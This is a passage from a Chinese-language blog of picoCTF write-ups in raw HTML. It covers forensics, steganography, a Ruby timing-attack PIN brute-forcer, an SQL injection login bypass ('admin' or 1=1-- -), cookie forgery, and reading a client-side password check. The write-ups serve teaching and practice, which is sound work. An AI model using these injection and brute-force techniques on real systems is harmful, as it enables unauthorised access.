Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
Warning: Permanently added '</span><span class="o">[</span>saturn.picoctf.net]:56167<span class="s1">' (ED25519) to the list of known hosts.
Welcome to Ubuntu 20.04.3 LTS (GNU/Linux 5.13.0-1017-aws x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/advantage

This system has been minimized by removing packages and content that are
not required on a system that users do not log into.

To restore this content, you can run the '</span>unminimize<span class="s1">' command.

The programs included with the Ubuntu system are free software;
the exact distribution terms for each program are described in the
individual files in /usr/share/doc/*/copyright.

Ubuntu comes with ABSOLUTELY NO WARRANTY, to the extent permitted by
applicable law.

ctf-player@challenge:~$ ls
flag.txt
ctf-player@challenge:~$ cat flag.txt
picoCTF{k3y_5l3u7h_75b85d71}
</span></code></pre></div></div>

<p>这里稍微需要绕一点的地方就是, 偷来的密钥需要增加一个<code class="language-plaintext highlighter-rouge">600</code>的属性, 
然后可以连接到服务器上.</p>

<h3 id="eavesdrop">Eavesdrop</h3>
<p>这次的问题类似于Packet Primer, 也是一个数据包的跟踪题目. 
检查了数据包里面的内容, 发现好像是一个类似于聊天对话的样子. 
看看?</p>

<div class="language-text highlighter-rouge"><div class="highlight"><pre class="highlight"><code>9001  &gt; 57876: Hey, how do you decrypt this file again?
57876 &gt; 9001 : You're serious?
9001  &gt; 57876: Yeah, I'm serious. 
57876 &gt; 9001 : *sigh* openssl des3 -d -salt -in file.des3 -out file.txt -k supersecretpassword123
9001  &gt; 57876: Ok, great, thanks.
57876 &gt; 9001 : Let's use Discord next time, it's more secure.
9001  &gt; 57876: C'mon, no one knows we use this program like this!
57876 &gt; 9001 : Whatever. 
9001  &gt; 57876: Hey.
57876 &gt; 9001 : Yeah?
9001  &gt; 57876: Could you transfer the file to me again?
57876 &gt; 9001 : Oh great. Ok, over 9002?
9001  &gt; 57876: Yeah, listening. 
# 中间有一段数据传输
57876 &gt; 9001 : Sent it
9001  &gt; 57876: Got it.
</code></pre></div></div>

<p>唔, 有画面了. 某天受害人在和它/他/她的朋友在聊天, 
然后聊天通道是一个完全没有加密的数据传输. 然后有一个笑面男, 
蹲在边上, 静静地听着, 然后悄悄地拿到了你的数据. Oops.</p>

<p>然后看看那段数据传输的过程里面的东西:</p>

<div class="language-irb highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="go">&gt; flag = "\x53\x61\x6c\x74\x65\x64\x5f\x5f\xbf\x1f\x35\x43\xc1\x43\x7
d\x48\x9a\xc5\xc7\x00\xf4\x80\x91\x46\x79\x9c\x9d\x50\x3b\x55\x14\x76\xa3\xf0\x6
1\x59\x29\x3b\xee\x7c\x9e\x51\x83\xfb\x5c\x4a\x18\x4c"
 =&gt; "Salted__\xBF\u001F5C\xC1C}H\x9A\xC5\xC7\u0000\xF4\x80\x91Fy\x9C\x9DP;...
&gt; File.open("flaag.enc", "w").write flag
</span></code></pre></div></div>

<p>嗯, 然后我把这个保存到了文件里面, 然后按照对话里面的做法, 
就可以轻松解码了. (才怪, 其实在解码的时候, 我遇到了一个很坑的问题, 
就是可能是因为我的openssl的版本的问题还是什么, 我在自己电脑上解码
就显示错误, 但是跑到picoCTF的服务器的在线shell上面就可以通过了. )</p>

<h3 id="operation-orchild">Operation Orchild</h3>
<p>感觉这种在磁盘里面找信息的题目有点上头.
知道方法了之后就非常简单了, 难点不过只是如何有效地找到磁盘里面的重要信息. 
就像我之前说的一样. 看终端的历史记录其实是一个比较有意思的突破口. 
所以我看看:</p>

<p>这个是我在<code class="language-plaintext highlighter-rouge">root</code>文件夹里面找到的东西:</p>

<div class="language-shell highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="o">&gt;</span> fls <span class="nt">-o</span> 411648 disk.flag.img 472
r/r 1875:	.ash_history
r/r <span class="k">*</span> 1876<span class="o">(</span>realloc<span class="o">)</span>:	flag.txt
r/r 1782:	flag.txt.enc
<span class="o">&gt;</span> icat <span class="nt">-o</span> 411648 <span class="nt">-r</span> disk.flag.img 1875
<span class="nb">touch </span>flag.txt
nano flag.txt 
apk get nano
apk <span class="nt">--help</span>
apk add nano
nano flag.txt 
openssl
openssl aes256 <span class="nt">-salt</span> <span class="nt">-in</span> flag.txt <span class="nt">-out</span> flag.txt.enc <span class="nt">-k</span> unbreakablepassword1234567
<span class="nb">shred</span> <span class="nt">-u</span> flag.txt
<span class="nb">ls</span> <span class="nt">-al</span>
halt
</code></pre></div></div>

<p>通过查看终端的历史得到加密<code class="language-plaintext highlighter-rouge">flag.txt</code>的方法, 
然后就可以进行对应的解密方法.</p>

<p>然后我遇到了奇葩的错误, 在picoCTF上面, 我解密了文本, 
然后解密的过程中告诉我bad encrypt, 好几次都是这样. 
然后我很无聊地就cat了一下输出的文件, 然后, 竟然, 
flag就在里面, 可以读到. 那为何告诉我解密失败? 怪.</p>

<p>解码的方法和前面的方法几乎就是一样的. 略.</p>

<h3 id="st3g0">St3g0</h3>
<p>是文件隐写术的类型的题目. 这种东西, 怎么说呢, 有点神奇, 
我不是特别擅长这些. 但是最后我在网上发现了一个
<a href="https://0xrick.github.io/lists/stego/">宝藏网站</a></p>

<p>这道题我使用了一个叫做<code class="language-plaintext highlighter-rouge">zsteg</code>的gem. 简直就是自动化之神器.</p>

<div class="language-shell highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="o">&gt;</span> gem <span class="nb">install </span>zsteg
<span class="o">&gt;</span> zsteg <span class="nt">-a</span> pico.flag.png
b1,r,lsb,xy         .. text: <span class="s2">"~__B&gt;VG?G@"</span>
b1,rgb,lsb,xy       .. text: <span class="s2">"picoCTF{7h3r3_15_n0_5p00n_a9a181eb}</span><span class="nv">$t3g0</span><span class="s2">"</span>
</code></pre></div></div>

<h3 id="sidechannel">SideChannel</h3>
<p>这个题目一开始我是想不出来的. Side Load Attack是一种Web里面的攻击方法, 
类似于通过程序运行的一些侧面表现来旁敲侧击来看看攻击是否成功. 
比如在SQL注入里面, 有一种时间注入法, 通过看看有没有执行注入的时停代码, 
假如能够时停的话, 就说明你的攻击成功啦.</p>

<p>嗯, 这道题的做法大概就是这样的. 虽然我没有非常严格地分析一下程序的汇编, 
然后程序的机理没有特别的了解. 基本上我看到的像是一个对输入的每一位, 
都进行一个处理, 然后根据程序的表现来看看是否有成功的迹象.</p>

<p>最后我猜测应该是假如成功的话, 就会执行代码, 然后运行的时间就会比其他
错误的情况要长一些. 所以基于这个想法, 我编写了一个测试的程序:</p>

<div class="language-ruby highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="k">def</span> <span class="nf">test</span><span class="p">(</span><span class="n">str</span><span class="p">)</span>
  <span class="n">t</span> <span class="o">=</span> <span class="no">Time</span><span class="p">.</span><span class="nf">new</span>
  <span class="n">handler</span> <span class="o">=</span> <span class="no">IO</span><span class="p">.</span><span class="nf">popen</span> <span class="s2">"./pin"</span><span class="p">,</span> <span class="s2">"w+"</span>
  <span class="n">handler</span><span class="p">.</span><span class="nf">puts</span> <span class="n">str</span><span class="p">.</span><span class="nf">ljust</span><span class="p">(</span><span class="mi">8</span><span class="p">,</span> <span class="s2">"0"</span><span class="p">)</span>
  <span class="n">res</span> <span class="o">=</span> <span class="s2">""</span>
  <span class="k">while</span> <span class="n">read</span> <span class="o">=</span> <span class="n">handler</span><span class="p">.</span><span class="nf">gets</span>
    <span class="n">res</span> <span class="o">&lt;&lt;</span> <span class="n">read</span>
  <span class="k">end</span>
  <span class="n">time</span> <span class="o">=</span> <span class="no">Time</span><span class="p">.</span><span class="nf">new</span> <span class="o">-</span> <span class="n">t</span>
  <span class="nb">puts</span> <span class="n">res</span> <span class="o">+</span> <span class="n">str</span> <span class="o">+</span> <span class="s2">"</span><span class="si">#{</span><span class="n">time</span><span class="si">}</span><span class="s2">"</span>
  <span class="k">return</span> <span class="n">time</span>
<span class="k">end</span>

<span class="n">charset</span> <span class="o">=</span> <span class="p">(</span><span class="s2">"0"</span><span class="o">..</span><span class="s2">"9"</span><span class="p">).</span><span class="nf">to_a</span>
<span class="n">playload</span> <span class="o">=</span> <span class="s2">""</span>

<span class="mi">8</span><span class="p">.</span><span class="nf">times</span> <span class="k">do</span>
  <span class="n">max_time</span> <span class="o">=</span> <span class="mi">0</span>
  <span class="n">the_c</span> <span class="o">=</span> <span class="s2">""</span>
  <span class="n">charset</span><span class="p">.</span><span class="nf">each</span> <span class="k">do</span> <span class="o">|</span><span class="n">c</span><span class="o">|</span>
    <span class="n">t</span> <span class="o">=</span> <span class="nb">test</span><span class="p">(</span><span class="n">playload</span> <span class="o">+</span> <span class="n">c</span><span class="p">)</span>
    <span class="k">if</span> <span class="n">t</span> <span class="o">&gt;</span> <span class="n">max_time</span>
      <span class="n">max_time</span> <span class="o">=</span> <span class="n">t</span>
      <span class="n">the_c</span> <span class="o">=</span> <span class="n">c</span>
    <span class="k">end</span>
  <span class="k">end</span>
  <span class="n">playload</span> <span class="o">&lt;&lt;</span> <span class="n">the_c</span>
<span class="k">end</span>
</code></pre></div></div>

<p>不过还是有运气的成分啦. 
因为我发现在后来复现的时候, 上面的代码并不能成功解决, 
可能是我写错了, 因为一开始我是手动暴力匹配的, 
通过一个个的测试(当然, 是每次用代码测试一位, 然后每次看到可能的数字的时候, 
就会多试几次, 看看是不是真的是最长时间. 可能是因为虚拟机的原因, 
我的那个虚拟机有时候会输出一个非常离谱的运行时间… )</p>

<div class="language-shell highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="o">&gt;</span> nc saturn.picoctf.net 50364
Verifying that you are a human...
Please enter the master PIN code:
48390513
Password correct. Here<span class="s1">'s your flag:
picoCTF{t1m1ng_4tt4ck_914c5ec3}
</span></code></pre></div></div>

<h2 id="web">Web</h2>
<h3 id="includes">Includes</h3>
<p>F12检查代码, 在Sources里面检查, 发现script.js
和style.css里面有注释, 注释里面有flag</p>

<h3 id="inspect-html">Inspect HTML</h3>
<p>在源代码里面发现了一句注释:</p>
<div class="language-html highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c">&lt;!--picoCTF{1n5p3t0r_0f_h7ml_fd5d57bd}--&gt;</span>
</code></pre></div></div>

<p>真就是检查HTML…</p>

<h3 id="search-source">Search Source</h3>
<p>在Hints里面告诉我要mirror site, 然后再搜索, 
嗯… 这就学起来:</p>

<p>首先是如何将网站mirror下来: 
<a href="https://osxdaily.com/2009/03/19/how-to-easily-mirror-an-entire-web-site-locally/">How to Easily Mirror an Entire Web Site Locally</a></p>

<p>上面的说法, 应该用<code class="language-plaintext highlighter-rouge">wegt</code>命令来, 试试.</p>

<p>然后是如何使用高级的搜索方法… 看我的:</p>

<div class="language-shell highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="o">&gt;</span> find <span class="nb">.</span> <span class="nt">-name</span> <span class="s2">"flag"</span>
<span class="o">&gt;</span> <span class="nb">grep</span> <span class="nt">--color</span><span class="o">=</span>auto <span class="nt">-iRnH</span> <span class="s1">'pico'</span> <span class="k">*</span>
css/style.css:328:/<span class="k">**</span> banner_main picoCTF<span class="o">{</span>1nsp3ti0n_0f_w3bpag3s_8de925a7<span class="o">}</span> <span class="k">**</span>/
</code></pre></div></div>

<p>输出结果很漂亮哦.</p>

<h3 id="sql-direct">SQL Direct</h3>
<p>这里用的是一套和mysql不一样的数据库系统. 
不过虽然有点点不一样, 但是最终的SQL查询语句还是一样的.</p>

<p>首先是连接到远程的数据库:</p>

<div class="language-shell highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="o">&gt;</span> psql <span class="nt">-h</span> saturn.picoctf.net <span class="nt">-p</span> 52302 <span class="nt">-U</span> postgres pico
Password <span class="k">for </span>user postgres: 
psql <span class="o">(</span>14.2<span class="o">)</span>
Type <span class="s2">"help"</span> <span class="k">for </span>help.
</code></pre></div></div>

<p>然后列出(list)数据库:</p>

<div class="language-shell highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nv">pico</span><span class="o">=</span><span class="c"># \l</span>
                                 List of databases
   Name    |  Owner   | Encoding |  Collate   |   Ctype    |   Access privileges   
<span class="nt">-----------</span>+----------+----------+------------+------------+-----------------------
 pico      | postgres | UTF8     | en_US.utf8 | en_US.utf8 | 
 postgres  | postgres | UTF8     | en_US.utf8 | en_US.utf8 | 
 template0 | postgres | UTF8     | en_US.utf8 | en_US.utf8 | <span class="o">=</span>c/postgres          +
           |          |          |            |            | <span class="nv">postgres</span><span class="o">=</span>CTc/postgres
 template1 | postgres | UTF8     | en_US.utf8 | en_US.utf8 | <span class="o">=</span>c/postgres          +
           |          |          |            |            | <span class="nv">postgres</span><span class="o">=</span>CTc/postgres
<span class="o">(</span>4 rows<span class="o">)</span>

</code></pre></div></div>

<p>然后选择(choose)数据库:</p>

<div class="language-shell highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nv">pico</span><span class="o">=</span><span class="c"># \c pico</span>
You are now connected to database <span class="s2">"pico"</span> as user <span class="s2">"postgres"</span><span class="nb">.</span>
</code></pre></div></div>

<p>通过<code class="language-plaintext highlighter-rouge">\d [table]</code>来查看表单信息:</p>

<div class="language-shell highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nv">pico</span><span class="o">=</span><span class="c"># \d</span>
         List of relations
 Schema | Name  | Type  |  Owner   
<span class="nt">--------</span>+-------+-------+----------
 public | flags | table | postgres
<span class="o">(</span>1 row<span class="o">)</span>

<span class="nv">pico</span><span class="o">=</span><span class="c"># \d flags</span>
                        Table <span class="s2">"public.flags"</span>
  Column   |          Type          | Collation | Nullable | Default 
<span class="nt">-----------</span>+------------------------+-----------+----------+---------
 <span class="nb">id</span>        | integer                |           | not null | 
 firstname | character varying<span class="o">(</span>255<span class="o">)</span> |           |          | 
 lastname  | character varying<span class="o">(</span>255<span class="o">)</span> |           |          | 
 address   | character varying<span class="o">(</span>255<span class="o">)</span> |           |          | 
Indexes:
    <span class="s2">"flags_pkey"</span> PRIMARY KEY, btree <span class="o">(</span><span class="nb">id</span><span class="o">)</span>

</code></pre></div></div>

<p>于是就是经典的SQL查询啦:</p>

<div class="language-shell highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nv">pico</span><span class="o">=</span><span class="c"># SELECT * FROM flags;</span>
 <span class="nb">id</span> | firstname | lastname  |                address                 
<span class="nt">----</span>+-----------+-----------+----------------------------------------
  1 | Luke      | Skywalker | picoCTF<span class="o">{</span>L3arN_S0m3_5qL_t0d4Y_21c94904<span class="o">}</span>
  2 | Leia      | Organa    | Alderaan
  3 | Han       | Solo      | Corellia
<span class="o">(</span>3 rows<span class="o">)</span>

<span class="nv">pico</span><span class="o">=</span><span class="c"># \q</span>
</code></pre></div></div>

<p>(最后的<code class="language-plaintext highlighter-rouge">\q</code>就是退出(quit)了)</p>

<h3 id="sqlilite">SQLiLite</h3>
<p>是 SQL 注入诶. 甚至还是有返回信息的注入诶, 这可不要太简单, 
甚至可以手动尝试:</p>

<div class="language-irb highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="go">3.0.0 :001 &gt; require 'net/http'
 =&gt; true 
3.0.0 :002 &gt; uri = URI('http://saturn.picoctf.net:50587')
 =&gt; #&lt;URI::HTTP http://saturn.picoctf.net:50587&gt; 
3.0.0 :003 &gt; res = Net::HTTP.post_form(uri, 'username' =&gt; 'admin', 'password' =&gt;
 'password')
 =&gt; #&lt;Net::HTTPOK 200 OK readbody=true&gt;
3.0.0 :004 &gt; puts res.body
&lt;!doctype html&gt;
&lt;html&gt;
&lt;head&gt;
    &lt;title&gt;Login&lt;/title&gt;
    &lt;link rel="stylesheet" type="text/css" href="//maxcdn.bootstrapcdn.com/bootstrap/3.3.5/css/bootstrap.min.css"&gt;
&lt;/head&gt;
&lt;body&gt;
&lt;div class="container"&gt;
    &lt;div class="row"&gt;
        &lt;div class="col-md-12"&gt;
            &lt;div class="panel panel-primary" style="margin-top:50px"&gt;
                &lt;div class="panel-heading"&gt;
                    &lt;h3 class="panel-title"&gt;Log In&lt;/h3&gt;
                &lt;/div&gt;
                &lt;div class="panel-body"&gt;
                    &lt;form action="login.php" method="POST"&gt;
                        &lt;fieldset&gt;
                            &lt;div class="form-group"&gt;
                                &lt;label for="username"&gt;Username:&lt;/label&gt;
                                &lt;input type="text" id="username" name="username" class="form-control"&gt;
                            &lt;/div&gt;
                            &lt;div class="form-group"&gt;
                                &lt;label for="password"&gt;Password:&lt;/label&gt;
                                &lt;div class="controls"&gt;
                                    &lt;input type="password" id="password" name="password" class="form-control"&gt;
                                &lt;/div&gt;
                            &lt;/div&gt;
</span><span class="err">
</span><span class="go">                            &lt;input type="hidden" name="debug" value="0"&gt;
</span><span class="err">
</span><span class="go">                            &lt;div class="form-actions"&gt;
                                &lt;input type="submit" value="Login" class="btn btn-primary"&gt;
                            &lt;/div&gt;
                        &lt;/fieldset&gt;
                    &lt;/form&gt;
                &lt;/div&gt;
            &lt;/div&gt;
        &lt;/div&gt;
    &lt;/div&gt;
&lt;/div&gt;
&lt;/body&gt;
&lt;/html&gt;
 =&gt; nil 
</span></code></pre></div></div>

<p>首先观察登录方式, 是在<code class="language-plaintext highlighter-rouge">login.php</code>里面用POST方法登陆的. 
然后随便构造一个测试一下:</p>

<div class="language-irb highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="go">3.0.0 :005 &gt; uri = URI('http://saturn.picoctf.net:50587/login.php')
 =&gt; #&lt;URI::HTTP http://saturn.picoctf.net:50587/login.php&gt; 
3.0.0 :006 &gt; res = Net::HTTP.post_form(uri, 'username' =&gt; 'admin', 'password' =&gt;
 'password')
 =&gt; #&lt;Net::HTTPOK 200 OK readbody=true&gt; 
3.0.0 :007 &gt; puts res.body
&lt;pre&gt;username: admin
password: password
SQL query: SELECT * FROM users WHERE name=&amp;#039;admin&amp;#039; AND password=&amp;#039;password&amp;#039;
&lt;/pre&gt;&lt;h1&gt;Login failed.&lt;/h1&gt;
 =&gt; nil
</span></code></pre></div></div>

<p>发现这个直接就把查询的语句给放上来了, 这可真的是不妙啊, 
于是我一开始准备写一个测试用的函数来方便多次手工注入, 结果, 
让我失望的是, 这个直接就被万能公式给解决了:</p>

<div class="language-irb highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="go">3.0.0 :009 &gt; def test(username, password)
3.0.0 :010 &gt;   uri = URI('http://saturn.picoctf.net:50587/login.php')
3.0.0 :011 &gt;   res = Net::HTTP.post_form(uri, 'username' =&gt; username, 'password'
 =&gt; 'password')
3.0.0 :012 &gt;   puts res.body
3.0.0 :013 &gt;   res.body
3.0.0 :014 &gt; end
 =&gt; :test 
3.0.0 :015 &gt; test("admin' or 1=1-- -", "password")
&lt;pre&gt;username: admin&amp;#039; or 1=1-- -
password: password
SQL query: SELECT * FROM users WHERE name=&amp;#039;admin&amp;#039; or 1=1-- -&amp;#039; AND password=&amp;#039;password&amp;#039;
&lt;/pre&gt;&lt;h1&gt;Logged in! But can you see the flag, it is in plainsight.&lt;/h1&gt;&lt;p hidden&gt;Your flag is: picoCTF{L00k5_l1k3_y0u_solv3d_it_ec8a64c7}&lt;/p&gt;
 =&gt; "&lt;pre&gt;username: admin&amp;#039; or 1=1-- -\npassword: password\nSQL query: SELECT * FROM users WHERE name=&amp;#039;admin&amp;#039; or 1=1-- -&amp;#039; AND password=&amp;#039;password&amp;#039;\n&lt;/pre&gt;&lt;h1&gt;Logged in! But can you see the flag, it is in plainsight.&lt;/h1&gt;&lt;p hidden&gt;Your flag is: picoCTF{L00k5_l1k3_y0u_solv3d_it_ec8a64c7}&lt;/p&gt;"
</span></code></pre></div></div>

<p>轻松.</p>

<h3 id="power-cookie">Power Cookie</h3>
<p>看名字肯定是改 Cookie, 试了几次, 从<code class="language-plaintext highlighter-rouge">true</code>, <code class="language-plaintext highlighter-rouge">True</code>, 
最后改成了<code class="language-plaintext highlighter-rouge">1</code>, 然后通过了.</p>

<p>思考网站的背后的机制, 应该是http://saturn.picoctf.net:61304/
将Cookie写入, 并写成<code class="language-plaintext highlighter-rouge">0</code>, 然后在http://saturn.picoctf.net:61304/check.php
检查名字叫做<code class="language-plaintext highlighter-rouge">isAdmin</code>的<code class="language-plaintext highlighter-rouge">Cookie</code>的值.</p>

<p>后来思考了一下, 为什么一开始没有成功, 原因估计就是我没搞清楚机制, 
在主网页更新了Cookie, 但是跳转到check页的时候Cookie被无视了, 
于是导致了我死活登录不上.</p>

<p>稍微介绍一下, Cookie有点像是古代皇上给臣子的那种免死金牌, 
网站把Cookie给到你的游览器, 然后下一次你登陆网站的时候, 
亮出你的免死金牌, 网站就会把你轻松放过. 但是免死金牌有时候也有时限, 
比如换了新的皇帝, 你的前朝金牌就没有那么吃香了. 所以你就要重新认证, 
让服务器重新给你一块免死金牌. 或者是这个皇帝很小心, 怕别人伪造, 
(对不起, 这道题里面的你就要伪造免死金牌啦), 经常更换. 
也会导致你需要重新认证. 说白了, 免死金牌虽然给用户带来了方便, 
但是因为可以伪造, 并且读取Cookie会有记录用户数据的考虑.</p>

<h3 id="local-authority">Local Authority</h3>
<p>这道题的名字非常有提示意味, 真的是在本地来检测登陆认证的.</p>

<div class="language-html highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="cp">&lt;!DOCTYPE html&gt;</span>
<span class="nt">&lt;html</span> <span class="na">lang=</span><span class="s">"en"</span><span class="nt">&gt;</span>
  <span class="nt">&lt;head&gt;</span>
    <span class="nt">&lt;meta</span> <span class="na">charset=</span><span class="s">"UTF-8"</span><span class="nt">&gt;</span>
    <span class="nt">&lt;meta</span> <span class="na">name=</span><span class="s">"viewport"</span> <span class="na">content=</span><span class="s">"width=device-width, initial-scale=1.0"</span><span class="nt">&gt;</span>
    <span class="nt">&lt;meta</span> <span class="na">http-equiv=</span><span class="s">"X-UA-Compatible"</span> <span class="na">content=</span><span class="s">"ie=edge"</span><span class="nt">&gt;</span>
    <span class="nt">&lt;link</span> <span class="na">rel=</span><span class="s">"stylesheet"</span> <span class="na">href=</span><span class="s">"style.css"</span><span class="nt">&gt;</span>
    <span class="nt">&lt;title&gt;</span>Login Page<span class="nt">&lt;/title&gt;</span>
  <span class="nt">&lt;/head&gt;</span>
  <span class="nt">&lt;body&gt;</span>
    <span class="nt">&lt;script </span><span class="na">src=</span><span class="s">"secure.js"</span><span class="nt">&gt;&lt;/script&gt;</span>
    
    <span class="nt">&lt;p</span> <span class="na">id=</span><span class="s">'msg'</span><span class="nt">&gt;&lt;/p&gt;</span>
    
    <span class="nt">&lt;form</span> <span class="na">hidden</span> <span class="na">action=</span><span class="s">"admin.php"</span> <span class="na">method=</span><span class="s">"post"</span> <span class="na">id=</span><span class="s">"hiddenAdminForm"</span><span class="nt">&gt;</span>
      <span class="nt">&lt;input</span> <span class="na">type=</span><span class="s">"text"</span> <span class="na">name=</span><span class="s">"hash"</span> <span class="na">required</span> <span class="na">id=</span><span class="s">"adminFormHash"</span><span class="nt">&gt;</span>
    <span class="nt">&lt;/form&gt;</span>
    
    <span class="nt">&lt;script </span><span class="na">type=</span><span class="s">"text/javascript"</span><span class="nt">&gt;</span>
      <span class="kd">function</span> <span class="nx">filter</span><span class="p">(</span><span class="nx">string</span><span class="p">)</span> <span class="p">{</span>
        <span class="nx">filterPassed</span> <span class="o">=</span> <span class="kc">true</span><span class="p">;</span>
        <span class="k">for</span> <span class="p">(</span><span class="kd">let</span> <span class="nx">i</span> <span class="o">=</span><span class="mi">0</span><span class="p">;</span> <span class="nx">i</span> <span class="o">&lt;</span> <span class="nx">string</span><span class="p">.</span><span class="nx">length</span><span class="p">;</span> <span class="nx">i</span><span class="o">++</span><span class="p">){</span>
          <span class="nx">cc</span> <span class="o">=</span> <span class="nx">string</span><span class="p">.</span><span class="nx">charCodeAt</span><span class="p">(</span><span class="nx">i</span><span class="p">);</span>
          
          <span class="k">if</span> <span class="p">(</span> <span class="p">(</span><span class="nx">cc</span> <span class="o">&gt;=</span> <span class="mi">48</span> <span class="o">&amp;&amp;</span> <span class="nx">cc</span> <span class="o">&lt;=</span> <span class="mi">57</span><span class="p">)</span> <span class="o">||</span>
               <span class="p">(</span><span class="nx">cc</span> <span class="o">&gt;=</span> <span class="mi">65</span> <span class="o">&amp;&amp;</span> <span class="nx">cc</span> <span class="o">&lt;=</span> <span class="mi">90</span><span class="p">)</span> <span class="o">||</span>
               <span class="p">(</span><span class="nx">cc</span> <span class="o">&gt;=</span> <span class="mi">97</span> <span class="o">&amp;&amp;</span> <span class="nx">cc</span> <span class="o">&lt;=</span> <span class="mi">122</span><span class="p">)</span> <span class="p">)</span>
          <span class="p">{</span>
            <span class="nx">filterPassed</span> <span class="o">=</span> <span class="kc">true</span><span class="p">;</span>     
          <span class="p">}</span>
          <span class="k">else</span>
          <span class="p">{</span>
            <span class="k">return</span> <span class="kc">false</span><span class="p">;</span>
          <span class="p">}</span>
        <span class="p">}</span>
        
        <span class="k">return</span> <span class="kc">true</span><span class="p">;</span>
      <span class="p">}</span>
    
      <span class="nb">window</span><span class="p">.</span><span class="nx">username</span> <span class="o">=</span> <span class="dl">"</span><span class="s2">admin</span><span class="dl">"</span><span class="p">;</span>
      <span class="nb">window</span><span class="p">.</span><span class="nx">password</span> <span class="o">=</span> <span class="dl">"</span><span class="s2">password</span><span class="dl">"</span><span class="p">;</span>
      
      <span class="nx">usernameFilterPassed</span> <span class="o">=</span> <span class="nx">filter</span><span class="p">(</span><span class="nb">window</span><span class="p">.</span><span class="nx">username</span><span class="p">);</span>
      <span class="nx">passwordFilterPassed</span> <span class="o">=</span> <span class="nx">filter</span><span class="p">(</span><span class="nb">window</span><span class="p">.</span><span class="nx">password</span><span class="p">);</span>
      
      <span class="k">if</span> <span class="p">(</span> <span class="nx">usernameFilterPassed</span> <span class="o">&amp;&amp;</span> <span class="nx">passwordFilterPassed</span> <span class="p">)</span> <span class="p">{</span>
      
        <span class="nx">loggedIn</span> <span class="o">=</span> <span class="nx">checkPassword</span><span class="p">(</span><span class="nb">window</span><span class="p">.</span><span class="nx">username</span><span class="p">,</span> <span class="nb">window</span><span class="p">.</span><span class="nx">password</span><span class="p">);</span>
        
        <span class="k">if</span><span class="p">(</span><span class="nx">loggedIn</span><span class="p">)</span>
        <span class="p">{</span>
          <span class="nb">document</span><span class="p">.</span><span class="nx">getElementById</span><span class="p">(</span><span class="dl">'</span><span class="s1">msg</span><span class="dl">'</span><span class="p">).</span><span class="nx">innerHTML</span> <span class="o">=</span> <span class="dl">"</span><span class="s2">Log In Successful</span><span class="dl">"</span><span class="p">;</span>
          <span class="nb">document</span><span class="p">.</span><span class="nx">getElementById</span><span class="p">(</span><span class="dl">'</span><span class="s1">adminFormHash</span><span class="dl">'</span><span class="p">).</span><span class="nx">value</span> <span class="o">=</span> <span class="dl">"</span><span class="s2">2196812e91c29df34f5e217cfd639881</span><span class="dl">"</span><span class="p">;</span>
          <span class="nb">document</span><span class="p">.</span><span class="nx">getElementById</span><span class="p">(</span><span class="dl">'</span><span class="s1">hiddenAdminForm</span><span class="dl">'</span><span class="p">).</span><span class="nx">submit</span><span class="p">();</span>
        <span class="p">}</span>
        <span class="k">else</span>
        <span class="p">{</span>
          <span class="nb">document</span><span class="p">.</span><span class="nx">getElementById</span><span class="p">(</span><span class="dl">'</span><span class="s1">msg</span><span class="dl">'</span><span class="p">).</span><span class="nx">innerHTML</span> <span class="o">=</span> <span class="dl">"</span><span class="s2">Log In Failed</span><span class="dl">"</span><span class="p">;</span>
        <span class="p">}</span>
      <span class="p">}</span>
      <span class="k">else</span> <span class="p">{</span>
        <span class="nb">document</span><span class="p">.</span><span class="nx">getElementById</span><span class="p">(</span><span class="dl">'</span><span class="s1">msg</span><span class="dl">'</span><span class="p">).</span><span class="nx">innerHTML</span> <span class="o">=</span> <span class="dl">"</span><span class="s2">Illegal character in username or password.</span><span class="dl">"</span>
      <span class="p">}</span>
    <span class="nt">&lt;/script&gt;</span>
    
  <span class="nt">&lt;/body&gt;</span>
<span class="nt">&lt;/html&gt;</span>
</code></pre></div></div>

<p>观察网页的源代码, 我发现了一个叫做<code class="language-plaintext highlighter-rouge">checkPassword</code>的函数, 
然后顺藤摸瓜, 发现这个函数竟然就是一个本地的js… 怪不得叫做是本地验证. 
直接就把源码写在网页的脚本里面, 属于是客户端检查了, 而不是服务器检查了.</p>

<div class="language-javascript highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="kd">function</span> <span class="nx">checkPassword</span><span class="p">(</span><span class="nx">username</span><span class="p">,</span> <span class="nx">password</span><span class="p">)</span>
<span class="p">{</span>
  <span class="k">if</span><span class="p">(</span> <span class="nx">username</span> <span class="o">===</span> <span class="dl">'</span><span class="s1">admin</span><span class="dl">'</span> <span class="o">&amp;&amp;</span> <span class="nx">password</span> <span class="o">===</span> <span class="dl">'</span><span class="s1">strongPassword098765</span><span class="dl">'</span> <span class="p">)</span>
  <span class="p">{</span>
    <span class="k">return</span> <span class="kc">true</span><span class="p">;</span>
  <span class="p">}</span>
  <span class="k">else</span>
  <span class="p">{</span>
    <span class="k">return</span> <span class="kc">false</span><span class="p">;</span>
  <span class="p">}</span>
<span class="p">}</span>
</code></pre></div></div>

<p>所以用户名和密码就显而易见了.</p>

<p>但是后来我觉得这种方法还是太一般了, 我为何不直接执行验证成功的语句, 
这样不是更加方便吗? 所以:</p>

<p>在游览器的console里面运行js脚本就好了.</p>

